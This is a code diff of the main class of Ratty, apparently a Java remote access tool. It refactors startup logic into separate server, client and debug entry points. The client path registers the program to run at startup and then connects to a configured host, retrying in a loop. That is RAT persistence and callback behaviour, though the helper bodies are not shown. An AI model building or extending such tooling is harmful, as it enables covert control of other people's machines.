@@ -24,7 +24,7 @@ import de.sogomn.rat.server.ActiveServer;
 public final class Ratty {
 	
 	public static final boolean DEBUG = true;
-	public static final String VERSION = "1.20.0";
+	public static final String VERSION = "1.20.1";
 	public static final ResourceBundle LANGUAGE = ResourceBundle.getBundle("language.lang");
 	
 	private static String address;
@@ -42,11 +42,22 @@ public final class Ratty {
 	private static final String DEBUG_SERVER = LANGUAGE.getString("debug.server");
 	private static final String DEBUG_CLIENT = LANGUAGE.getString("debug.client");
 	
+	static {
+		final String[] lines = FileUtils.readInternalLines(CONNECTION_DATA_FILE_NAME);
+		final String addressString = lines[0].trim();
+		final String portString = lines[1].trim();
+		final String clientString = lines[2].trim();
+		
+		address = addressString;
+		port = Integer.parseInt(portString);
+		client = Boolean.parseBoolean(clientString);
+	}
+	
 	private Ratty() {
 		//...
 	}
 	
-	private static void setLookAndFeel() {
+	private static void setNimbusLookAndFeel() {
 		final NimbusLookAndFeel nimbus = new NimbusLookAndFeel();
 		final UIDefaults defaults = nimbus.getDefaults();
 		
@@ -61,15 +72,17 @@ public final class Ratty {
 		}
 	}
 	
-	private static void readConnectionData() throws ArrayIndexOutOfBoundsException, NumberFormatException {
-		final String[] lines = FileUtils.readInternalLines(CONNECTION_DATA_FILE_NAME);
-		final String addressString = lines[0].trim();
-		final String portString = lines[1].trim();
-		final String clientString = lines[2].trim();
-		
-		address = addressString;
-		port = Integer.parseInt(portString);
-		client = Boolean.parseBoolean(clientString);
+	private static void setSystemLookAndFeel() {
+		try {
+			final String className = UIManager.getSystemLookAndFeelClassName();
+			
+			JFrame.setDefaultLookAndFeelDecorated(true);
+			JDialog.setDefaultLookAndFeelDecorated(true);
+			
+			UIManager.setLookAndFeel(className);
+		} catch (final Exception ex) {
+			ex.printStackTrace();
+		}
 	}
 	
 	private static void addToStartup() {
@@ -101,7 +114,48 @@ public final class Ratty {
 		}
 	}
 	
-	public static void connectToHost(final String address, final int port) {
+	private static void startDebug() {
+		final String[] options = {DEBUG_SERVER, DEBUG_CLIENT};
+		final int input = JOptionPane.showOptionDialog(null, DEBUG_MESSAGE, null, JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE, null, options, null);
+		
+		if (input == JOptionPane.YES_OPTION) {
+			System.out.println(DEBUG_SERVER);
+			
+			setNimbusLookAndFeel();
+			startServer(port);
+		} else if (input == JOptionPane.NO_OPTION) {
+			System.out.println(DEBUG_CLIENT);
+			
+			setSystemLookAndFeel();
+			startClient(address, port);
+		}
+	}
+	
+	private static void startClient() {
+		addToStartup();
+		setSystemLookAndFeel();
+		startClient(address, port);
+	}
+	
+	private static void startServer() {
+		setNimbusLookAndFeel();
+		
+		final String input = JOptionPane.showInputDialog(PORT_INPUT_QUESTION);
+		
+		if (input == null) {
+			return;
+		}
+		
+		final int port = parsePort(input);
+		
+		if (port != -1) {
+			startServer(port);
+		} else {
+			JOptionPane.showMessageDialog(null, PORT_ERROR_MESSAGE, null, JOptionPane.ERROR_MESSAGE);
+		}
+	}
+	
+	public static void startClient(final String address, final int port) {
 		final ActiveConnection connection = new ActiveConnection(address, port);
 		
 		if (!connection.isOpen()) {
@@ -111,7 +165,7 @@ public final class Ratty {
 				//...
 			} finally {
 				System.gc();
-				connectToHost(address, port);
+				startClient(address, port);
 			}
 			
 			return;
@@ -134,39 +188,12 @@ public final class Ratty {
 	}
 	
 	public static void main(final String[] args) {
-		setLookAndFeel();
-		readConnectionData();
-		
 		if (DEBUG) {
-			final String[] options = {DEBUG_SERVER, DEBUG_CLIENT};
-			final int input = JOptionPane.showOptionDialog(null, DEBUG_MESSAGE, null, JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE, null, options, null);
-			
-			if (input == JOptionPane.YES_OPTION) {
-				System.out.println(DEBUG_SERVER);
-				
-				startServer(port);
-			} else if (input == JOptionPane.NO_OPTION) {
-				System.out.println(DEBUG_CLIENT);
-				
-				connectToHost(address, port);
-			}
+			startDebug();
 		} else if (client) {
-			addToStartup();
-			connectToHost(address, port);
+			startClient();
 		} else {
-			final String input = JOptionPane.showInputDialog(PORT_INPUT_QUESTION);
-			
-			if (input == null) {
-				return;
-			}
-			
-			final int port = parsePort(input);
-			
-			if (port != -1) {
-				startServer(port);
-			} else {
-				JOptionPane.showMessageDialog(null, PORT_ERROR_MESSAGE, null, JOptionPane.ERROR_MESSAGE);
-			}
+			startServer();
 		}
 	}
 	
